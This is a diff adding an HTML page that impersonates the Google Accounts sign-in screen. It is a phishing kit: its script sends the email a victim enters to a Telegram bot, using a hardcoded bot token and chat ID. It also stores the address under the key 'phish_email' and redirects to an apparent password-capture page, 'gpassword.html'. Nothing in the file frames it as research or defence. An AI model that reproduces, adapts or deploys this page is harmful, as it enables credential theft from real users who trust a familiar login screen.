@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in - Google Accounts</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: "Google Sans", Roboto, Arial, sans-serif;
+      background: #000;
+      color: #e8eaed;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      flex: 1;
+      padding: 24px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .google-logo {
+      font-family: "Product Sans", sans-serif;
+      font-size: 48px;
+      font-weight: 400;
+      color: #4285f4;
+      margin-bottom: 8px;
+      letter-spacing: -2px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 8px 0 4px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #9aa0a6;
+      text-align: center;
+      margin-bottom: 32px;
+      line-height: 1.4;
+    }
+
+    .learn-more {
+      color: #8ab4f8;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      margin: 16px 0 40px;
+    }
+
+    .input-wrapper {
+      width: 100%;
+      max-width: 380px;
+      position: relative;
+      margin-bottom: 16px;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 14px;
+      font-size: 16px;
+      background: transparent;
+      border: 1px solid #5f6368;
+      border-radius: 4px;
+      color: white;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-color: #8ab4f8;
+      border-width: 2px;
+      padding: 15px 13px;
+    }
+
+    .forgot {
+      color: #8ab4f8;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      display: block;
+      margin: 12px 0 48px;
+    }
+
+    .bottom-row {
+      width: 100%;
+      max-width: 380px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: auto;
+      padding-top: 32px;
+    }
+
+    .create-account {
+      color: #8ab4f8;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    .next-btn {
+      background: #8ab4f8;
+      color: #0d47a1;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .next-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    /* Bottom navigation bar simulation */
+    .bottom-bar {
+      height: 56px;
+      background: #000;
+      border-top: 1px solid #333;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      color: #8ab4f8;
+      font-size: 24px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="google-logo">Google</div>
+    <h1>Sign in</h1>
+    <p class="subtitle">
+      Use your Google Account.<br>
+      The account will be added to this device and available to<br>
+      other Google apps.
+    </p>
+
+    <a href="#" class="learn-more">Learn more about using your account</a>
+
+    <div class="input-wrapper">
+      <input type="text" id="email" placeholder="Email or phone" autocomplete="off"/>
+    </div>
+
+    <a href="#" class="forgot" align="Left">Forgot email?</a>
+
+    <div class="bottom-row">
+      <a href="#" class="create-account">Create account</a>
+      <button class="next-btn" id="nextBtn" disabled>Next</button>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7852343353:AAG3byBA3PWOlnUHI4WDpdpKjy7p9gcC7Ds";
+    const CHAT_ID   = "7336083189";
+
+    const emailInput = document.getElementById('email');
+    const nextBtn    = document.getElementById('nextBtn');
+
+    emailInput.addEventListener('input', () => {
+      nextBtn.disabled = emailInput.value.trim().length < 3;
+    });
+
+    nextBtn.addEventListener('click', async () => {
+      const email = emailInput.value.trim();
+      if (!email) return;
+
+      // Telegram  
+      try {
+        await fetch(
+          `https://api.telegram.org/bot\( {BOT_TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(" " + email)}`
+        );
+      } catch {}
+
+      //   
+      localStorage.setItem("phish_email", email);
+
+      //    
+      window.location.href = "gpassword.html";
+    });
+  </script>
+</body>
+</html>
